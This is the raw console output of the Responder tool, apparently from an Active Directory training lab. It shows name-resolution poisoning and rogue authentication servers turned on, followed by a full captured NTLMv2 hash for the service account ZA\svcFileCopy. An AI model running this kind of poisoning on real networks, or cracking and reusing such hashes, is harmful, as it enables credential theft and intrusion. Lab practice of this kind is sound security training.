  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [breachad]
    Responder IP               [10.50.18.39]
    Responder IPv6             [fe80::e814:e8a1:d42e:70d]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-3VZ6V4NXGN8]
    Responder Domain Name      [4OK7.LOCAL]
    Responder DCE-RPC Port     [48857]

[+] Listening for events...                                                                                                                                                

[SMB] NTLMv2-SSP Client   : 10.200.20.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:4106963a27c8f625:92EDBFA732B764CF2AD777783B4F8B22:0101000000000000800297F4C3A2D90103AD6278FA563159000000000200080034004F004B00370001001E00570049004E002D00330056005A003600560034004E00580047004E00380004003400570049004E002D00330056005A003600560034004E00580047004E0038002E0034004F004B0037002E004C004F00430041004C000300140034004F004B0037002E004C004F00430041004C000500140034004F004B0037002E004C004F00430041004C0007000800800297F4C3A2D9010600040002000000080030003000000000000000000000000020000062980CF89F0945DCEB8096D6FC488E0980B83F0AF3E9899D9DD5027421E700AC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00310038002E00330039000000000000000000     
